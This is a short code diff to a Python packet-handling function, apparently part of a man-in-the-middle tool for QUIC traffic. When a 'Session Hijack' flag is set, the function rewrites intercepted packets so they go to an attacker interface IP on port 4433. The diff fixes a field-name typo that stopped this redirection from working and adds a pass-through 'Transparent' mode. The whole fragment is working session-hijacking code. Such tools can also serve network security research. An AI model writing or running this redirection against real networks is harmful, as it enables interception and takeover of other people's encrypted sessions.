@@ -66,13 +66,16 @@ def handle_quic(pkt):
                     return
                 elif (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                     new_pkt = pkt[IP]
-                    new_pkt[IP].dest = attacker_inner_iface_ip
+                    new_pkt[IP].dst = attacker_inner_iface_ip
                     new_pkt[UDP].dport = 4433
                     del new_pkt.getlayer(IP).chksum
                     del new_pkt.getlayer(UDP).chksum
                     #print(f"New PKT to server: {new_pkt.summary()}")
                     send(new_pkt, iface=inner_iface, verbose=False)
                     print("Sent shit")
+                    return
+                 elif (vs[pkt[IP].src].status["Transparent"] or vs[pkt[IP].src][pkt[IP].dst]["Transparent"]):
+                    add_and_send_to_server(pkt)
                     return
             add_and_send_to_server(pkt)
             
